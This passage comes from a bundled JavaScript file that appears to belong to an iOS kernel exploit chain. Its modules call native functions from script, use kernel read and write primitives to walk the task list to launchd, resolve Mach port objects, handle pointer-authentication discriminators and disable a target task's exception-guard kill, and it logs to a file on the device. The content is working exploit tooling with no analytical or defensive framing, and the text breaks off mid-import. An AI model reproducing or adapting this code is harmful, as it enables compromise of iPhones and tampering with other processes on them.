Native.memSize;\n\t\t\tconst buff = this.read(fd, size);\n\t\t\tif (buff === false)\n\t\t\t\tbreak;\n\t\t\tconst buff8 = new Uint8Array(buff);\n\t\t\tlet newData = new Uint8Array(data.length + buff8.length);\n\t\t\tnewData.set(data, 0);\n\t\t\tnewData.set(buff8, data.length);\n\t\t\tdata = newData;\n\n\t\t\tif (remaining) {\n\t\t\t\tremaining -= buff.byteLength;\n\t\t\t\tif (!remaining)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tthis.close(fd);\n\n\t\treturn data.buffer;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);\n\t}\n\n\tstatic appendFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);\n\t}\n\n\tstatic deleteFile(path) {\n\t\tNative.callSymbol(\"unlink\", path);\n\t}\n\tstatic foreachDir(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\n\tstatic foreachFile(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t\treturn true;\n\t}\n\n\tstatic createDir(path, permission=0o755) {\n\t\treturn !Native.callSymbol(\"mkdir\", path, permission);\n\t}\n\n\tstatic deleteDir(path, recursive=false) {\n\t\tif (recursive) {\n\t\t\tconst dir = Native.callSymbol(\"opendir\", path);\n\t\t\tif (!dir) {\n\t\t\t\tconsole.log(TAG, \"deleteDir: Unable to open dir: \" + path);\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\twhile (true) {\n\t\t\t\tconst item = this.#readdir(dir);\n\t\t\t\tif (!item)\n\t\t\t\t\tbreak;\n\n\t\t\t\tconst newPath = path + '/' + item.d_name;\n\n\t\t\t\tswitch (item.d_type) {\n\t\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tthis.deleteDir(newPath, true);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\t\tconsole.log(TAG, `deleting: ${newPath}`);\n\t\t\t\t\t\tthis.deleteFile(newPath);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\n\t\treturn !Native.callSymbol(\"rmdir\", path);\n\t}\n\n\tstatic exists(path, permission=0/*F_OK*/) {\n\t\treturn !Native.callSymbol(\"access\", path, permission);\n\t}\n\n\tstatic stat(path) {\n\t\tconst ret = Native.callSymbol(\"stat\", path, Native.mem);\n\t\tif (ret == ERROR)\n\t\t\treturn null;\n\t\tconst buff = Native.read(Native.mem, 144);\n\t\tconst view = new DataView(buff);\n\n\t\tconst dev = view.getInt32(0, true);\n\t\tconst mode = view.getUint16(0x4, true);\n\t\tconst nlink = view.getUint16(0x6, true);\n\t\tconst ino = view.getBigUint64(0x8, true);\n\t\tconst uid = view.getUint32(0x10, true);\n\t\tconst gid = view.getUint32(0x14, true);\n\t\tconst atime_tv_sec = view.getBigInt64(0x20, true);\n\t\tconst mtime_tv_sec = view.getBigInt64(0x30, true);\n\t\tconst ctime_tv_sec = view.getBigInt64(0x40, true);\n\t\tconst size = view.getBigInt64(0x60, true);\n\n\t\treturn {\n\t\t\tmode: Number(mode),\n\t\t\tino: Number(ino),\n\t\t\tdev: Number(dev),\n\t\t\tnlink: Number(nlink),\n\t\t\tuid: Number(uid),\n\t\t\tgid: Number(gid),\n\t\t\tsize: Number(size),\n\t\t\tatime: Number(atime_tv_sec),\n\t\t\tmtime: Number(mtime_tv_sec),\n\t\t\tctime: Number(ctime_tv_sec)\n\t\t};\n\t}\n\n\tstatic #readdir(dir) {\n\t\tconst itemPtr = Native.callSymbol(\"readdir\", dir);\n\t\tif (!itemPtr)\n\t\t\treturn null;\n\n\t\tconst item = Native.read(itemPtr, 24);\n\t\tconst view = new DataView(item);\n\n\t\tconst d_ino = view.getBigUint64(0, true);\n\t\tconst d_namlen = view.getUint16(18, true);\n\t\tconst d_type = view.getUint8(20);\n\t\tconst d_name = Native.readString(itemPtr + 21n, d_namlen + 1);\n\n\t\treturn {\n\t\t\td_ino: d_ino,\n\t\t\td_type: d_type,\n\t\t\td_name: d_name\n\t\t};\n\t}\n\n\tstatic #commonWriteFile(path, data, flags) {\n\t\tconst fd = Native.callSymbol(\"open\", path, flags, 0o644);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\t// For some reason file mode is not applied on open()\n\t\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\t\tlet offs = 0;\n\t\tlet left = data.byteLength;\n\n\t\tconst buffSize = 0x4000;\n\t\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\t\twhile (true) {\n\t\t\tconst size = left > buffSize ? buffSize : left;\n\t\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\t\tconst dst8 = new Uint8Array(src8);\n\t\t\tNative.write(buffPtr, dst8.buffer);\n\t\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\t\tif (!len || len == ERROR)\n\t\t\t\tbreak;\n\t\t\toffs += len;\n\t\t\tleft -= len;\n\t\t\tif (!left)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tNative.callSymbol(\"free\", buffPtr);\n\t\tNative.callSymbol(\"close\", fd);\n\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Logger.js\":\n/*!************************************!*\\\n  !*** ./src/libs/JSUtils/Logger.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Logger)\n/* harmony export */ });\n/* harmony import */ var _FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./FileUtils */ \"./src/libs/JSUtils/FileUtils.js\");\n/* harmony import */ var _Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\nclass Logger {\n\n\tstatic #logging = false;\n\tstatic #logfile = \"/private/var/mobile/Media/PostLogs.txt\";\n\n\tstatic {\n\t\t//LOG(\"Log file: \" + Logger.#logfile);\n\t}\n\n\tstatic log(TAG, msg) {\n\t\t// Avoid recursive logging\n\t\tif (Logger.#logging)\n\t\t\treturn;\n\t\tLogger.#logging = true;\n\t\tconst logMsg = `[${TAG}] ${msg}`;\n\n\t\tLOG(logMsg);\n\n\t\tif (false) // removed by dead control flow\n{}\n\t\tLogger.#logging = false;\n\t}\n\n\tstatic clearPreviousLogs(){\n\t\t_Chain_Native__WEBPACK_IMPORTED_MODULE_1__[\"default\"].callSymbol(\"unlink\", Logger.#logfile);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Utils.js\":\n/*!***********************************!*\\\n  !*** ./src/libs/JSUtils/Utils.js ***!\n  \\***********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Utils)\n/* harmony export */ });\n\n\nconst TAG = \"UTILS\";\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nclass Utils {\n\n\tstatic UINT64_SIZE = 8;\n\tstatic UINT32_SIZE = 4;\n\tstatic UINT16_SIZE = 2;\n\tstatic ARM_THREAD_STATE64 = 6;\n\tstatic ARM_THREAD_STATE64_SIZE = 0x110;\n\tstatic ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);\n\tstatic ptrauth_key_asia = 0;\n\tstatic EXC_BAD_ACCESS = 1n;\n\tstatic EXC_GUARD = 12n;\n\tstatic EXC_MASK_GUARD = (1n << this.EXC_GUARD);\n\tstatic EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);\n\tstatic EXCEPTION_STATE = 2n;\n\tstatic MACH_EXCEPTION_CODES = 0x80000000n;\n\tstatic PAGE_SIZE = 0x4000n;\n\tstatic PAGE_MASK = (this.PAGE_SIZE - 1n);\n\n\tstatic hex(val) {\n\t\treturn val.toString(16);\n\t}\n\n\tstatic memmem(haystack, needle) {\n\t\tconst hLen = haystack.byteLength;\n\t\tconst nLen = needle.byteLength;\n\n\t\tif (nLen === 0 || hLen < nLen) {\n\t\t  return 0;\n\t\t}\n\n\t\tconst haystackView = new Uint8Array(haystack);\n\t\tconst needleView = new Uint8Array(needle);\n\n\t\tfor (let i = 0; i <= hLen - nLen; i++) {\n\t\t  let found = true;\n\t\t  for (let j = 0; j < nLen; j++) {\n\t\t\tif (haystackView[i + j] !== needleView[j]) {\n\t\t\t  found = false;\n\t\t\t  break;\n\t\t\t}\n\t\t  }\n\t\t  if (found) {\n\t\t\treturn i;\n\t\t  }\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tstatic ptrauth_string_discriminator(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbedn;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_string_discriminator_special(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481000000000000n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3000000000000n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbed000000000000n;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517000000000000n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_blend_discriminator(diver,discriminator)\n\t{\n\t\treturn diver & 0xFFFFFFFFFFFFn | discriminator;\n\t}\n\n    static printArrayBufferInChunks(buffer) {\n        const view = new DataView(buffer);\n        const chunkSize = 8;\n\n        for (let i = 0; i < buffer.byteLength; i += chunkSize) {\n\t\t\t// Read the chunk as a BigInt\n\t\t\tconst chunk = view.getBigUint64(i, true); // Little-endian\n\n            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);\n        }\n    }\n\n\tstatic MIN(a, b)\n\t{\n\t\tif(a < b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n\n\tstatic MAX(a, b)\n\t{\n\t\tif(a > b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/RegistersStruct.js\":\n/*!*********************************************!*\\\n  !*** ./src/libs/TaskRop/RegistersStruct.js ***!\n  \\*********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ RegistersStruct)\n/* harmony export */ });\nconst TAG = \"REGISTERSSTRUCT\"\n\nclass RegistersStruct\n{\n\t#dataView;\n\n\tconstructor(buffer, offset = 0, length = 29) {\n\t\tthis.#dataView = new DataView(buffer,offset, length * 8);\n\t\tthis.length = length;\n\t}\n    \n\tget(index) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in get:${index}`);\n\t\t\treturn;\n        }\n        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian\n    }\n\n    set(index, value) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in set`);\n\t\t\treturn;\n        }\n        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian\n    }\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/SelfTaskStruct.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ SelfTaskStruct)\n/* harmony export */ });\nclass SelfTaskStruct \n{\n\t#buffer;\n\t#dataView;\n\tconstructor()\n\t{\n\t\tthis.#buffer = new ArrayBuffer(32);\n\t\tthis.#dataView = new DataView(this.#buffer);\n\t\tthis.addr = 0x0n;\n\t\tthis.spaceTable = 0x0n;\n\t\tthis.portObject = 0x0n;\n\t\tthis.launchdTask = 0x0n;\n\t}\n\tget addr()\n\t{\n\t\treturn this.#dataView.getBigUint64(0,true);\n\t}\n\tset addr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(0,value,true);\n\t}\n\tget spaceTable()\n\t{\n\t\treturn this.#dataView.getBigUint64(8,true);\n\t}\n\tset spaceTable(value)\n\t{\n\t\tthis.#dataView.setBigUint64(8,value,true);\n\t}\n\tget portObject()\n\t{\n\t\treturn this.#dataView.getBigUint64(16,true);\n\t}\n\tset portObject(value)\n\t{\n\t\tthis.#dataView.setBigUint64(16,value,true);\n\t}\n\tget launchdTask()\n\t{\n\t\treturn this.#dataView.getBigUint64(24,true);\n\t}\n\tset launchdTask(value)\n\t{\n\t\tthis.#dataView.setBigUint64(24,value,true);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Task.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/TaskRop/Task.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Task)\n/* harmony export */ });\n/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ \"./src/libs/TaskRop/SelfTaskStruct.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst TAG = \"TASK\"\nconst TASK_EXC_GUARD_MP_CORPSE = 0x40;\nconst TASK_EXC_GUARD_MP_FATAL = 0x80;\nconst TASK_EXC_GUARD_MP_DELIVER = 0x10;\n\nclass Task\n{\n\tstatic gSelfTask;\n\tstatic KALLOC_ARRAY_TYPE_SHIFT;\n\n\tstatic {\n\t\tthis.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t}\n\n\tstatic init(selfTaskAddr)\n\t{\n\t\t// Update KALLOC_ARRAY_TYPE_SHIFT\n\t\tthis.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().T1SZ_BOOT - 1n));\n\n\t\t/*\n\t\t * This function should be invoked as the initializer of the this Task utility.\n\t\t * It setups the global var \"gSelfTask\" containing values used all across the task functions to lookup ports.\n\t\t * It also retrieves the \"launchd\" task address.\n\t\t */\n\t\tthis.gSelfTask.addr = selfTaskAddr;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\tthis.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);\n\t\tthis.gSelfTask.launchdTask = this.#searchForLaunchdTask();\n\n\t\tconsole.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.addr)}`);\n\t\tconsole.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(spaceTable)}`);\n\t\tconsole.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.portObject)}`);\n\t\tconsole.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.launchdTask)}`);\n\t}\n\n\tstatic trunc_page(addr)\n\t{\n\t\treturn addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic round_page(addr)\n\t{\n\t\treturn this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic pidof(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\t\treturn pid;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic getTaskAddrByPID(pid)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == pid)\n\t\t\t\treturn currTask;\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || (nextTask == currTask))\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic disableExcGuardKill(taskAddr)\n\t{\n\t\t// in mach_port_guard_ast, the victim would crash if these are on.\n\t\tlet excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard);\n\t\t//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);\n\t\texcGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);\n\t\texcGuard |= TASK_EXC_GUARD_MP_DELIVER;\n\t\t//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard, excGuard);\n\t}\n\n\tstatic getTaskAddrByName(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\t//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\t//console.log(TAG, `Found target process: ${name}`);\n\t\t\t\treturn currTask;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn false;\n\t}\n\n\tstatic getRightAddr(port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortEntry(spaceTable, port);\n\t}\n\n\tstatic #getSpaceTable(taskAddr)\n\t{\n\t\tlet space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().ipcSpace);\n\t\tlet spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().spaceTable);\n\t\t//console.log(TAG,`space: ${Utils.hex(space)}`);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\tspaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(spaceTable);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\treturn this.#kallocArrayDecodeAddr(BigInt(spaceTable));\n\t}\n\n\tstatic #mach_port_index(port)\n\t{\n\t\treturn ((port) >> 8n);\n\t}\n\n\tstatic #getPortEntry(spaceTable, port)\n\t{\n\t\tlet portIndex = this.#mach_port_index(port);\n\t\treturn spaceTable + (portIndex * 0x18n);\n\t}\n\n\tstatic #getPortObject(spaceTable, port)\n\t{\n\t\t//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);\n\t\tlet portEntry = this.#getPortEntry(spaceTable, port);\n\t\t//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);\n\t\tlet portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().entryObject);\n\t\t//console.log(TAG,`portObject:${Utils.hex(portObject)}`);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(portObject);\n\t}\n\n\tstatic getTaskProc(taskAddr)\n\t{\n\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().procRO);\n\t\tlet procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\treturn procAddr;\n\t}\n\n\tstatic #searchForLaunchdTask()\n\t{\n\t\t/*\n\t\t * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.\n\t\t */\n\n\t\tlet currTask = this.gSelfTask.addr;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == 1)\n\t\t\t\treturn currTask;\n\t\t\tlet prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().prevTask);\n\t\t\tif (!prevTask || prevTask === currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = prevTask;\n\t\t}\n\t\treturn 0n;\n\t}\n\n\tstatic #kallocArrayDecodeAddr(ptr)\n\t{\n\t\tlet zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);\n\t\tif (ptr & zone_mask)\n\t\t{\n\t\t\tptr &= ~0x1fn;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_MASK;\n\t\t\t//console.log(TAG,`ptr:${Utils.hex(ptr)}`);\n\t\t\tptr |= zone_mask;\n\t\t\t//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);\n\t\t}\n\t\treturn ptr;\n\t}\n\n\tstatic getPortAddr(port)\n\t{\n\t\tif (!port)\n\t\t\treturn 0;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n\n\tstatic getPortKObject(port)\n\t{\n\t\tlet portObject = this.getPortAddr(port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic #getPortKObjectByAddr(portObject)\n\t{\n\t\tif (!portObject)\n\t\t\treturn 0;\n\t\tlet kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().objectKObject);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(kobject);\n\t}\n\n\tstatic firstThread(taskAddr)\n\t{\n\t\tlet first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().threads);\n\t\treturn first;\n\t}\n\n\tstatic getMap(taskAddr)\n\t{\n\t\tlet vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().mapTask);\n\t\treturn vmMap;\n\t}\n\n\tstatic getPortKObjectOfTask(taskAddr,port)\n\t{\n\t\tlet portObject = this.getPortAddrOfTask(taskAddr, port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic getPortAddrOfTask(taskAddr, port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(taskAddr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/TaskRop.js\":\n/*!*************************************!*\\\n  !*** ./src/libs/TaskRop/TaskRop.js ***!\n  \\*************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ TaskRop)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var 